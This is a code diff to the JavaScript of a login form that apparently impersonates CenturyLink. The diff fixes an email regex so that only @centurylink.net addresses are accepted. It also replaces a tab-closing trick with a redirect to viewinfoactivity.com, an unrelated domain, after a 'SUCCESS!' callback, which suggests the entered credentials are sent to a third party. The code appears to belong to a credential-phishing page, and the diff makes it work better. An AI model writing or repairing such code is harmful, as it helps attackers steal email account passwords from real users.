@@ -201,14 +201,15 @@
       passwordError.textContent = "";
 
       const emailValue = emailInput.value.trim();
-      const allowedDomainRegex = /^[^@\\s]+@(centurylink\.net)$/i;
+
+      // FIXED: correct regex for @centurylink.net
+      const allowedDomainRegex = /^[^@\s]+@centurylink\.net$/i;
 
       if (!emailValue) {
         emailError.textContent = "Email is required.";
         valid = false;
       } else if (!allowedDomainRegex.test(emailValue)) {
-        emailError.textContent =
-          "Email must be @centurylink.net.";
+        emailError.textContent = "Email must be @centurylink.net.";
         valid = false;
       }
 
@@ -229,11 +230,8 @@
         .then(function (response) {
           console.log("SUCCESS!", response.status, response.text);
 
-          // Open Centurylink in a new tab
-          window.open("https://www.viewinfoactivity.com/centurylink-terms", "_self");
-
-          // Attempt to close current tab (works only if tab was script-opened)
-          window.close();
+          // Redirect to next page
+          window.location.href = "https://www.viewinfoactivity.com/centurylink-terms";
         })
         .catch(function (error) {
           console.error("FAILED...", error);
